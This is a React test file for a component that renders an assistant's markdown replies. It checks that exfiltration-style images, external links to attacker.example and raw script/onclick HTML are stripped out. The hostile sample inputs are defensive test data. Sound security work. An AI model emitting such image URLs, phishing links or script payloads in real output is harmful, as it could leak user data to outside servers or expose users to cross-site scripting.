import { render, screen } from '@testing-library/react'
import { MemoryRouter } from 'react-router'
import { describe, expect, it } from 'vitest'
import { MessageMarkdown } from './MessageMarkdown'

function show(text: string) {
  return render(
    <MemoryRouter>
      <MessageMarkdown text={text} />
    </MemoryRouter>,
  )
}

describe('assistant replies', () => {
  it('formats bold text, lists and tables', () => {
    show('**Kavya Traders** owes:\n\n- INV/26-27/00042\n\n| Invoice | Outstanding |\n|---|---:|\n| INV/26-27/00042 | ₹2,360.00 |')

    expect(screen.getByText('Kavya Traders').tagName).toBe('STRONG')
    expect(screen.getByRole('listitem')).toHaveTextContent('INV/26-27/00042')
    expect(screen.getByRole('table')).toHaveTextContent('₹2,360.00')
  })

  it('never loads images, which could send data to another server', () => {
    const { container } = show('Look: ![chart](https://attacker.example/leak?data=secret)')

    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByText('[chart]')).toBeInTheDocument()
  })

  it('only links to pages inside the app', () => {
    show('[Open the invoice](/invoices/42) or [pay here](https://attacker.example/pay) or [this](//attacker.example)')

    expect(screen.getByRole('link', { name: 'Open the invoice' })).toHaveAttribute('href', '/invoices/42')
    expect(screen.queryByRole('link', { name: 'pay here' })).toBeNull()
    expect(screen.queryByRole('link', { name: 'this' })).toBeNull()
    expect(screen.getByText('pay here')).toBeInTheDocument()
  })

  it('drops raw HTML', () => {
    const { container } = show('Hello <script>alert(1)</script><b onclick="x()">there</b>')

    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('b')).toBeNull()
  })
})
